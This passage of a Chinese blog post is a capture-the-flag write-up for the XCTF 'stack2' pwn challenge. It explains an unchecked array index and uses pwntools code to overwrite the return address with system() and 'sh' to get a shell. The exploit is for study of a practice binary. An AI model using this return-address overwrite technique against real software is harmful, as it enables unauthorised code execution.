class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"This_is_a_function.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> s;</span><br><span class="line">        s = fun();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"s is %d\n"</span>,s);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>      main和fun函数的汇编代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">000011a9 &lt;fun&gt;:</span><br><span class="line">   0x565561a9 &lt;+0&gt;:     push   ebp</span><br><span class="line">   0x565561aa &lt;+1&gt;:     mov    ebp,esp</span><br><span class="line">   0x565561ac &lt;+3&gt;:     push   ebx</span><br><span class="line">   0x565561ad &lt;+4&gt;:     sub    esp,0x4</span><br><span class="line">   0x565561b0 &lt;+7&gt;:     call   0x56556221 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   0x565561b5 &lt;+12&gt;:    add    eax,0x2e4b</span><br><span class="line">   0x565561ba &lt;+17&gt;:    sub    esp,0xc</span><br><span class="line">   0x565561bd &lt;+20&gt;:    lea    edx,[eax-0x1ff8]</span><br><span class="line">   0x565561c3 &lt;+26&gt;:    push   edx</span><br><span class="line">   0x565561c4 &lt;+27&gt;:    mov    ebx,eax</span><br><span class="line">   0x565561c6 &lt;+29&gt;:    call   0x56556040 &lt;puts@plt&gt;</span><br><span class="line">   0x565561cb &lt;+34&gt;:    add    esp,0x10</span><br><span class="line">   0x565561ce &lt;+37&gt;:    mov    eax,0x0</span><br><span class="line">   0x565561d3 &lt;+42&gt;:    mov    ebx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x565561d6 &lt;+45&gt;:    leave  </span><br><span class="line">   0x565561d7 &lt;+46&gt;:    ret</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">000011d8 &lt;main&gt;:</span><br><span class="line">   0x565561d8 &lt;+0&gt;:     lea    ecx,[esp+0x4]   </span><br><span class="line">   0x565561dc &lt;+4&gt;:     and    esp,0xfffffff0                                                               </span><br><span class="line">   0x565561df &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]                                                           </span><br><span class="line">   0x565561e2 &lt;+10&gt;:    push   ebp                                                                           </span><br><span class="line">   0x565561e3 &lt;+11&gt;:    mov    ebp,esp                                                                       </span><br><span class="line">   0x565561e5 &lt;+13&gt;:    push   ebx                                                                           </span><br><span class="line">   0x565561e6 &lt;+14&gt;:    push   ecx                                                                           </span><br><span class="line">   0x565561e7 &lt;+15&gt;:    sub    esp,0x10                                                                     </span><br><span class="line">   0x565561ea &lt;+18&gt;:    call   0x565560b0 &lt;__x86.get_pc_thunk.bx&gt;                                           </span><br><span class="line">   0x565561ef &lt;+23&gt;:    add    ebx,0x2e11                                                                   </span><br><span class="line">   0x565561f5 &lt;+29&gt;:    call   0x565561a9 &lt;fun&gt;                                                             </span><br><span class="line">   0x565561fa &lt;+34&gt;:    mov    DWORD PTR [ebp-0xc],eax                                                       </span><br><span class="line">   0x565561fd &lt;+37&gt;:    sub    esp,0x8                                                                       </span><br><span class="line">   0x56556200 &lt;+40&gt;:    push   DWORD PTR [ebp-0xc]                                                           </span><br><span class="line">   0x56556203 &lt;+43&gt;:    lea    eax,[ebx-0x1fe4]                                                                0x56556209 &lt;+49&gt;:    push   eax                                                                              0x5655620a &lt;+50&gt;:    call   0x56556030 &lt;printf@plt&gt;                                                       </span><br><span class="line">   0x5655620f &lt;+55&gt;:    add    esp,0x10                                                                     </span><br><span class="line">   0x56556212 &lt;+58&gt;:    mov    eax,0x0                                                                       </span><br><span class="line">   0x56556217 &lt;+63&gt;:    lea    esp,[ebp-0x8]                                                                 </span><br><span class="line">   0x5655621a &lt;+66&gt;:    pop    ecx                                                                           </span><br><span class="line">   0x5655621b &lt;+67&gt;:    pop    ebx</span><br><span class="line">   0x5655621c &lt;+68&gt;:    pop    ebp</span><br><span class="line">   0x5655621d &lt;+69&gt;:    lea    esp,[ecx-0x4]</span><br><span class="line">   0x56556220 &lt;+72&gt;:    ret</span><br></pre></td></tr></table></figure><p>      观察main函数中调用fun函数时栈中的变化，如图所示：</p><p><img src="/images/123-1.png" alt></p><p>      从上图中可以看出，在进入fun函数之后，main+34偏移处的地址<code>0x565561fa</code>被放在了栈中，这也就是我们所说的返回地址，我们将断点打到<code>0x565561d6</code>处，也就是fun函数中的leave指令的地方，我们观察寄存器和栈中的情况。由于leave指令相当于<code>movl %ebp %esp; popl %ebp</code>，具体的如下图：</p><p><img src="/images/123-2.jpg" alt></p><p>     也就是说，**在执行到 <code>ret</code> 语句的时候，寄存器<code>eip</code>指向函数的返回地址，**知道这一点就可以了</p><h4 id="font-color-blue2数组溢出原理font"><a class="markdownIt-Anchor" href="#font-color-blue2数组溢出原理font"></a> <font color="blue"><code>2.数组溢出原理</code></font></h4><p>      如果没有检查数组的输入上界，那么很容易产生溢出，在C语言中，数组的元素下标是从0开始计算的，所以，对于n个元素的数组a[n]， 遍历它的时候是a[0],a[1],…,a[n-1]，如果遍历到a[n]，数组就溢出了。下面就用一个简单的例子进行说明，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">3</span>] = &#123;<span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x33</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> a; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"输入数组索引下标："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;index);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"输出数组元素：array[%d] = 0x%x\n"</span>, index, <span class="built_in">array</span>[index]); <span class="comment">//数组越界读操作</span></span><br><span class="line">    <span class="comment">//array[index] = 1 ; //数组越界写操作</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>      下面用GDB进行调试，在执行第7行前，该程序的栈的示意图如下：</p><p><img src="/images/123-3.png" alt></p><p>      通过GDB的调试，我们可以发现数组寻址的方式为：<code>ebp+eax*4-0x18</code>，其中<code>0x18</code>是数组array首地址<code>ebp-0x18</code>得来的，<code>eax</code>也就是我们要输入的下标，这里之所以是<code>eax*4</code>，是因为数组array的值是int类型，4个字节大小。</p><p>      正常来说，我们要想输出array中的<code>0x22</code>的话，就需要我们输入下标<code>1</code>，使得<code>ebp+eax*4-0x18=0xffffd8c8+1*4-0x18=0xffffd8b4</code>，那么如果没有对输入的下标进行限制的话，那么就很有可能发生数组溢出的问题，比如这里我们可以输入下标为<code>4</code>，那么该程序会将<code>0xffffd8c8+4*4-0x18=0xffffd8c0</code>地址处的值<code>0xffffd8e0</code>打印出来，如下图所示：</p><p><img src="/images/123-4.png" alt></p><p>      以上就是数组溢出的一个原理了，在有的程序中，我们可以利用输入数组的值来达到改变<code>eip</code>的效果，本题就是一个很好的例子。</p><h4 id="font-color-blue3字符类型在数组中存放的形式字符和字符字面值font"><a class="markdownIt-Anchor" href="#font-color-blue3字符类型在数组中存放的形式字符和字符字面值font"></a> <font color="blue"><code>3.字符类型在数组中存放的形式（字符和字符字面值）</code></font></h4><p>      首先来问一个问题：<code>计算机为什么用二进制和十六进制</code>？<sup>[2]</sup></p><blockquote><p>因为二值信号可以很容易地被表示、存储和传输。例如，可以表示为穿孔卡片上有洞或无洞、导线上的高电压或低电压，或者顺时针或逆时针的磁场。而由于用二进制表示法太冗长，而十进制表示法与位模式的互相转换很麻烦，替代的方法是以16为基数，即十六进制（hexadecimal）。</p></blockquote><p>      再来问一个问题：<code>什么是字符字面值？</code><sup>[2]</sup></p><blockquote><p>字面值就是一种记号而已，比如3，100，a,c，3.14。因为我们不能修改它（你能说把3改成5吗？）所以有时候又叫它常量。比如 int a = 100；a是一个int型变量，100就是一个字面值。字面值100只能用来作右值，不能作左值。<br>C语言中字符字面值是由一对<code>单引号括起来的单个字符</code>，比如’a’、‘b’。实际上字符字面值和整型字面值是一样的。编译器把字符字面值都当做整型字面值处理。比如：</p><ul><li>定义一个字符变量并用字符字面值来初始化：char ch = ‘a’；或者 char ch = 0x61；</li><li>定义一个int型变量并用字符字面值来初始化：int a = ‘a’；也是可以的，<code>printf(&quot;%d&quot;,a);</code>输出结果为<code>97</code></li></ul></blockquote><p>      总结如下：</p><blockquote><ul><li>字符型可以和整型可以相互转化，在C语言中<code>字符型就是一种整型</code>，因为在内存中存储的是二进制形式，可以被解析成字符和字符字面值两个含义；</li><li>字符字面值是由单引号括起来的单个字符；</li></ul></blockquote><p>      上程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">5</span>]=<span class="string">"abcd"</span>;</span><br><span class="line"><span class="keyword">int</span> b = <span class="string">'c'</span>;</span><br><span class="line">a[<span class="number">1</span>] = <span class="number">0x62</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a[<span class="number">0</span>]==<span class="number">0x61</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a[0] == %c(char) == %d(int) == 0x%x(hex)\n"</span>,a[<span class="number">0</span>],a[<span class="number">0</span>],a[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a[1] == %c(char) == %d(int) == 0x%x(hex)\n"</span>,a[<span class="number">1</span>],a[<span class="number">1</span>],a[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"   b == %c(char) == %d(int) == 0x%x(hex)\n"</span>,b,b,b);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"!="</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>      输出的结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a[0] == a(char) == 97(int) == 0x61(hex)</span><br><span class="line">a[1] == b(char) == 98(int) == 0x62(hex)</span><br><span class="line">   b == c(char) == 99(int) == 0x63(hex)</span><br><span class="line">Press any key to continue</span><br></pre></td></tr></table></figure><blockquote><p>从上面的代码运行结果中可以看出，对于char类型输入0x62，这个值被当作字符面值相当于给a[1]输入了字符’b’，在内存中以二进制<code>01100010</code>的形式进行存储着</p></blockquote><h3 id="font-color-navy0x01-题目分析font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-题目分析font"></a> <font color="navy"><code>0x01 题目分析</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file stack </span><br><span class="line">stack: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d39da4953c662091eab7f33f7dc818f1d280cb12, not stripped</span><br></pre></td></tr></table></figure><blockquote><p>该文件是一个32位的ELF文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec stack </span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/2/stack2/stack&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><blockquote><p>开启了栈不可执行和金丝雀保护，也就是说我们无法使用栈溢出。使用IDA打开该文件，得到它的伪代码：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax@18</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [sp+18h] [bp-90h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [sp+1Ch] [bp-8Ch]@6</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+20h] [bp-88h]@2</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [sp+24h] [bp-84h]@5</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+28h] [bp-80h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+2Ch] [bp-7Ch]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [sp+30h] [bp-78h]@13</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [sp+34h] [bp-74h]@20</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">100</span>]; <span class="comment">// [sp+38h] [bp-70h]@2</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [sp+9Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v14 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*                      An easy calc                       *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*Give me your numbers and I will return to you an average *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*(0 &lt;= x &lt; 256)                                           *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How many numbers you have:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give me your numbers"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = v5; ; <span class="built_in">printf</span>(<span class="string">"average is %.2lf\n"</span>, (<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">double</span>)v9 / (<span class="keyword">double</span>)j), j) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Give me your number"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">0x63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            v13[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"id\t\tnumber"</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"%d\t\t%d\n"</span>, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"which number to change:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"new number:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">      v13[v5] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; j; ++l )</span><br><span class="line">      v9 += v13[l];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>仔细观察上述伪代码，可以发现在选择更改新的值的时候，没有对数组上界进行限制，产生了数组溢出漏洞；又在IDA中发现<code>hackhere</code>函数，里面调用了<code>system(&quot;/bin/bash&quot;)</code>函数，这里参考<a href="https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/" target="_blank" rel="noopener">官方的writeup</a>，指出：<code>这个题有个坑点在于题目给出了getshell的函数，但是出题人在搭建docker环境时未注意，环境中只给了sh，在发现问题后考虑到题目依然可解就未再次更改环境。题目依然是简单的栈溢出，只不过不能直接跳转到getshell，需要简单的ROP一下。</code>下面来确定v13与返回地址的偏移位置，v13是EBP-0x70,但是EIP却不是EBP+4,至于为什么, 有博主说这是因为开了Canary保护,需要动态调试计算这个偏移,下面来动态调试计算这个偏移。<sup>[1]</sup></p></blockquote><p><img src="/images/123-5.png" alt></p><blockquote><p>从上图可以看出该调试过程中的<code>main</code>函数ebp的地址为<code>0xffffd8d8</code>，而retn指令对应栈顶的地址为<code>0xffffd8ec</code>，也就是说返回地址的位置在<code>0xffffd8ec</code>，那么算下来两者之间差了<code>0xffffd8ec-0xffffd8d8=0x14</code>，这是因为开启了Canary的原因，正来说两者之间的差距应该为<code>0x4</code>，那么此时栈中的情况如下示意图：</p></blockquote><p><img src="/images/123-6.png" alt></p><blockquote><p>上图中包含了很多信息，主要有：</p><ul><li>返回地址相对于v13的偏移：<code>0x84</code></li><li>解释了为什么是<code>ebp+eax*1-0x70</code>：因为v13是一个char类型的字符数组，每一个值占一个空间</li></ul><p>那么下面我们来看看看怎么使得返回地址为system的地址，如下图：</p></blockquote><p><img src="/images/123-7.jpg" alt></p><blockquote><p>同样上图也包含了很多信息：</p><ul><li>因为是小端存储的方式，而system函数的地址为<code>0x08048450</code>，所以从低地址到高地址连续存储了<code>0x50</code>、<code>0x84</code>、<code>0x04</code>、<code>0x08</code></li><li>要明白得到<code>0x08048450</code>的结果是图中所示求得的，那么两种方式是否有联系呢？以后再探讨</li></ul></blockquote><p><img src="/images/123-8.png" alt></p><blockquote><p>通过gdb调试，我们可以看到返回地址已经成为了system函数地址，那么下面我们需要找到system函数的参数位置，其中栈的情况如下，</p></blockquote><p><img src="/images/123-10.png" alt></p><blockquote><p>从上图得知sh要写入的偏移是v13到返回地址的偏移再加上8<sup>[4]</sup>，我们进行gdb调试，看看是否能成功写入：</p></blockquote><p><img src="/images/123-9.png" alt></p><blockquote><p>从上图中可以看出我们已经成功地将system和sh的地址写入到我们想写入的地方</p></blockquote><h3 id="font-color-navy0x02-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-解题步骤font"></a> <font color="navy"><code>0x02 解题步骤</code></font></h3><blockquote><p>根据上文的分析，我们找到system、sh的地址和v13相对于返回地址的偏移：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">retn_esp = <span class="number">0xffffd8bc</span></span><br><span class="line">ebp = <span class="number">0xffffd8a8</span></span><br><span class="line">v13 = ebp - <span class="number">0x70</span></span><br><span class="line">offset = retn_esp - ebp + <span class="number">0x70</span></span><br><span class="line">print(<span class="string">"[*] offset is"</span>,offset,<span class="string">"("</span>,hex(offset),<span class="string">")"</span>)</span><br><span class="line">system_addr = [<span class="number">0x50</span>,<span class="number">0x84</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br><span class="line">sh = [<span class="number">0x87</span>,<span class="number">0x89</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br></pre></td></tr></table></figure><blockquote><p>这道题目前面几步的选择无关紧要，所以我们可以直接写出这部分的脚本：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"How many numbers you have:\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Give me your numbers\n"</span>,<span class="string">"1"</span>)</span><br></pre></td></tr></table></figure><blockquote><p>下面我们将system写入返回地址处，因为v13是一个字符类型的数组，所以我们需要地址分解为4部分，然后向连续的地址中进行写入：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change_addr</span><span class="params">(offset,addr_part)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"5. exit\n"</span>,<span class="string">"3"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"which number to change:\n"</span>,str(offset))</span><br><span class="line">r.sendlineafter(<span class="string">"new number:\n"</span>,str(addr_part))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">Change_addr(offset+i,system_addr[i])</span><br></pre></td></tr></table></figure><blockquote><p>下面我们将sh写入system参数的正确的位置，和上一步一样：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change_addr</span><span class="params">(offset,addr_part)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"5. exit\n"</span>,<span class="string">"3"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"which number to change:\n"</span>,str(offset))</span><br><span class="line">r.sendlineafter(<span class="string">"new number:\n"</span>,str(addr_part))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">Change_addr(offset+j+<span class="number">8</span>,sh[j])<span class="comment"># 一定要记得这里的偏移+8</span></span><br></pre></td></tr></table></figure><blockquote><p>结束程序运行，并与系统进行交互</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x03-expfont"><a class="markdownIt-Anchor" href="#font-color-navy0x03-expfont"></a> <font color="navy"><code>0x03 EXP</code></font></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 